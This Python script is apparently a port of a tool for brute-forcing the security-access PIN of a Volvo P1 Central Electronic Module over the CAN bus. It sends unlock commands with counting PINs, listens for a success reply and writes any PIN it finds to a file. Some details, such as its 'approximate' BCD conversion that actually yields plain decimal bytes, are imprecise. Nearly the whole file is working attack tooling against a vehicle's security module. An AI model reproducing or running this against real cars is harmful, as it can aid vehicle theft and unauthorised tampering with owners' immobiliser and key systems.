import can
import time
import sys

# --- CONFIGURATION (Based on VTL C++ Code) ---
# Request ID: 0x000FFFFE (Extended)
REQ_ID = 0x000FFFFE 
# Reply ID: The CEM usually replies on 0x00000003 or similar high-priority ID
# We will accept ANY reply that contains the CEM's signature.

# CEM Node ID for P1 Platform
CEM_ID = 0x50 

# Command: Volvo Proprietary Security Access
CMD_UNLOCK = 0xBE

# --- SETUP CAN BUS ---
# Note: We use 125k because the HAT usually bridges speeds, 
# but P1 High Speed bus is physically 500k. 
# If 125000 fails, try 500000.
try:
    bus = can.interface.Bus(channel='can0', bustype='socketcan', bitrate=125000)
except OSError:
    print("Error: Could not open can0. Did you run 'sudo ip link set can0 up...'?")
    sys.exit()

def send_pin(pin_bytes):
    """
    Sends a PIN attempt. 
    Format: [CEM_ID, CMD, PIN1, PIN2, PIN3, PIN4, PIN5, PIN6]
    """
    data = [CEM_ID, CMD_UNLOCK] + list(pin_bytes)
    msg = can.Message(arbitration_id=REQ_ID, data=data, is_extended_id=True)
    bus.send(msg)

def check_for_success():
    """
    Listens for a 'Positive Response' from the CEM.
    VTL Code says success is: [CEM_ID, 0xB9, 0x00...]
    """
    start_time = time.time()
    while time.time() - start_time < 0.2: # Wait up to 200ms
        msg = bus.recv(timeout=0.05)
        if msg:
            # Check if it looks like a CEM reply
            if len(msg.data) >= 2 and msg.data[0] == CEM_ID:
                # 0xB9 is the "Success" code (Command 0xBE + response flag?)
                if msg.data[1] == 0xB9:
                    return True
                # If we get other data, it might be a rejection, ignore it.
    return False

def main():
    print("--- VOLVO P1 CEM CRACKER (PYTHON PORT) ---")
    print("Note: This is a 'Dumb' Brute Force. It does not use timing attacks.")
    
    # 1. Connection Test
    print("Testing connection to CEM...")
    dummy_pin = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
    send_pin(dummy_pin)
    
    # We just want to see if we get *ANY* traffic back
    msg = bus.recv(timeout=1.0)
    if msg:
        print(f"SUCCESS: Received data from CAN ID {hex(msg.arbitration_id)}!")
        print(f"Data: {msg.data.hex()}")
    else:
        print("FAILURE: No response from car.")
        print("Check: 1. Ignition ON? 2. Wiring (H/L swapped?) 3. Bitrate (try 500k)")
        return

    # 2. The Loop (Demonstration)
    print("Starting Brute Force loop...")
    # REALITY CHECK: Trying all 280 Trillion PINs on a Pi takes 40,000 years.
    # This is useful ONLY if you know part of the PIN or want to test stability.
    
    # Let's try a small range just to show it running
    for i in range(1000000):
        # Generate a fake PIN (just counting up)
        # Convert 'i' to 6 bytes of BCD (approximate)
        pin_str = f"{i:012d}" 
        current_pin = [
            int(pin_str[0:2]), int(pin_str[2:4]), int(pin_str[4:6]),
            int(pin_str[6:8]), int(pin_str[8:10]), int(pin_str[10:12])
        ]
        
        # Print every 100 attempts so you know it's alive
        if i % 100 == 0:
            print(f"Trying: {current_pin}", end='\r')
            
        send_pin(current_pin)
        
        if check_for_success():
            print(f"\n\n!!! FOUND PIN: {current_pin} !!!")
            with open("found_pin.txt", "w") as f:
                f.write(str(current_pin))
            break

if __name__ == "__main__":
    main()
